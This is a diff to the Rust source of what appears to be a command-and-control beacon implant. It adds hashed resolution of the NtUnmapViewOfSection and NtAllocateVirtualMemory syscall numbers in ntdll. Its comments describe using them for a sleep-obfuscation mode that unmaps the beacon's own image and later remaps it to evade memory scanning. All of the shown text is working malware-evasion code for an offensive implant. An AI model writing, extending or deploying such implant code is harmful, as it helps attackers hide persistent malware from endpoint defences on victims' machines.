@@ -37,6 +37,8 @@ const DELAY_EXECUTION: (u64, u64) = syscalls::hash_nt_or_zw("NtDelayExecution");
 const GET_CONTEXT_THREAD: (u64, u64) = syscalls::hash_nt_or_zw("NtGetContextThread");
 const SET_CONTEXT_THREAD: (u64, u64) = syscalls::hash_nt_or_zw("NtSetContextThread");
 const PROTECT_VIRTMEM: (u64, u64) = syscalls::hash_nt_or_zw("NtProtectVirtualMemory");
+const UNMAP_VIEW: (u64, u64) = syscalls::hash_nt_or_zw("NtUnmapViewOfSection");
+const ALLOCATE_VIRTMEM: (u64, u64) = syscalls::hash_nt_or_zw("NtAllocateVirtualMemory");
 const SUSPEND_THREAD: (u64, u64) = syscalls::hash_nt_or_zw("NtSuspendThread");
 const RESUME_THREAD: (u64, u64) = syscalls::hash_nt_or_zw("NtResumeThread");
 const SET_INFORMATION_VIRTMEM: (u64, u64) =
@@ -88,6 +90,30 @@ pub unsafe fn protect_virtmem_ssn(ntdll: *mut c_void) -> Option<u32> {
     let mut zw = ZwStubs::new();
     syscalls::collect_zw_stubs(ntdll, &mut zw);
     ssn_of(ntdll, &zw, PROTECT_VIRTMEM)
+}
+
+/// SSN of `NtUnmapViewOfSection` — the Astral Projection window unmaps the
+/// beacon's own image after backing it up (mode 1 of the sleep stub).
+///
+/// # Safety
+///
+/// `ntdll` must be a valid mapped ntdll image.
+pub unsafe fn unmap_view_ssn(ntdll: *mut c_void) -> Option<u32> {
+    let mut zw = ZwStubs::new();
+    syscalls::collect_zw_stubs(ntdll, &mut zw);
+    ssn_of(ntdll, &zw, UNMAP_VIEW)
+}
+
+/// SSN of `NtAllocateVirtualMemory` — the remap after the unmap reallocates
+/// the image at its original base (mode 1 of the sleep stub).
+///
+/// # Safety
+///
+/// `ntdll` must be a valid mapped ntdll image.
+pub unsafe fn allocate_virtmem_ssn(ntdll: *mut c_void) -> Option<u32> {
+    let mut zw = ZwStubs::new();
+    syscalls::collect_zw_stubs(ntdll, &mut zw);
+    ssn_of(ntdll, &zw, ALLOCATE_VIRTMEM)
 }
 
 /// Execute an indirect syscall with 5 arguments (Microsoft x64 ABI:
